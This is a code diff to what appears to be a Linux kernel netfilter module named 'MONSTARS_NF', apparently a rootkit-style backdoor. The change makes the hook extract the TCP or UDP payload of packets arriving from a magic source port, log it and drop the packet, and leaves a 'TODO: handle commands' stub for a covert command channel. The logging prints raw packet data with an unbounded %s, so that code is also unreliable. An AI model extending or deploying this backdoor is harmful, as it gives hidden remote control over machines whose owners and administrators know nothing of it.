@@ -24,6 +24,7 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
     struct udphdr *udph = NULL;
     unsigned short src_port = 0;
     unsigned short dst_port = 0;
+    unsigned char* data = NULL;
 
     if (sockbuf)
     {
@@ -36,6 +37,11 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
                     src_port = ntohs(tcph->source);
                     dst_port = ntohs(tcph->dest);
                 }
+                if ((data = (unsigned char *)tcp_hdr(sockbuf)))
+                {
+                    data += sizeof(struct tcphdr);
+                }
+
             }
             else if (IPPROTO_UDP == iph->protocol)
             {
@@ -44,6 +50,10 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
                     src_port = ntohs(udph->source);
                     dst_port = ntohs(udph->dest);
                 }
+                if ((data = (unsigned char *)udp_hdr(sockbuf)))
+                {
+                    data += sizeof(struct udphdr);
+                }
             }
             // look for magic source port
             if (MAGIC_SRC_PORT == src_port)
@@ -51,6 +61,10 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
                 KERNEL_LOG("MONSTARS_NF : Magic %s %pI4:%d --> %pI4:%d\n",
                         (tcph ? "TCP" : "UDP"),
                         &iph->saddr, src_port, &iph->daddr, dst_port);
+                if (NULL != data)
+                {
+                    KERNEL_LOG("MONSTARS_NF : Received:  %s\n", data);
+                }
                 // TODO: handle commands
                 retval =  NF_DROP;
             }
